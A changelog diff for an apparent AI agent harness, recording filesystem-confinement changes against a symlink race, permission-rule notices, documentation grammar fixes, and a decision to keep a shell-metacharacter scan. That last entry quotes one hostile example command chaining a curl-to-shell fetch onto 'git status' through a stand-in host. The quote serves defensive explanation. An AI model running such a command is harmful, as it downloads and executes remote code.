@@ -7,6 +7,51 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Changed
+
+- **`conway.fs` enforces its own confinement root for all six of its tools —
+  `read`, `write`, `edit`, `cd`, `glob`, `grep` — and does so
+  open-relative**, closing a symlink-swap TOCTOU race that a check-then-open
+  step above the tool could not. The harness-level pre-gate root walk is
+  retired for those six. Two gaps were found and closed on the way: `edit`,
+  `glob` and `grep` had **no** `conway.fs`-level confinement at all and were
+  held only by that pre-gate, so retiring it naively would have unconfined
+  them; and `bash`'s own `cwd` argument stays checked by the harness, because
+  `bash` belongs to a different plugin with no containment mechanism to
+  delegate to. `--root`, `ConwayBuilder::with_root` and a spawned child's
+  `SubagentSpec::root` still confine end to end — one `--root` now covers
+  both artifact writes and ordinary tool calls at every fork/spawn depth.
+
+### Fixed
+
+- **An `allow`/`command_prefix` (or `always`) rule naming `bash` — or any
+  `ShellCommand`-rendering tool — now surfaces a registration notice** rather
+  than installing silently and matching nothing forever. That is the mirror
+  of the `read:*`-matched-nothing bug, and it was the gap the shell-gate
+  removal disclosed but left open. A notice rather than a hard rejection,
+  because rejecting would break every existing `permissions.json` carrying
+  such an entry for no protective gain — the rule already authorized nothing.
+- **Grammar holes the earlier citation-stripping sweep left behind, across
+  ~80 files.** Removing a board-ID citation sometimes took the surrounding
+  noun phrase with it: `"board item X found that class"` became `"found that
+  class"`, `"(board item X, closing Y)"` became `"(, closing)"` — sentences
+  left with no subject, a dangling comma, or a bare `()` where a citation had
+  been. Repaired by naming the concept rather than re-adding a ULID, across
+  `docs/plugins/`, `docs/`, and doc comments in every crate — including
+  `scripts/check-board-citations.py`'s own module doc, where the citation
+  checker had broken prose about citations.
+
+### Documented
+
+- **`AllowListGate`'s shell-metacharacter scan is examined and deliberately
+  kept**, not removed to match the durable pattern-grant gate. Removing it
+  would *widen* what a scoped `tool_name(pattern)` grant authorizes: a raw
+  glob's `*` matches shell metacharacters, so `bash(git *)` would begin
+  authorizing `git status; curl evil.com | sh`. The durable gate could drop
+  its scan safely only because no pattern grant survives for a `ShellCommand`
+  tool there at all. Reasoning recorded in `crates/conway/src/gates.rs` and
+  `docs/permissions.md`, pinned by a test.
+
 ### Added
 
 - **A resumed agent's per-agent plugin config survives the store round-trip
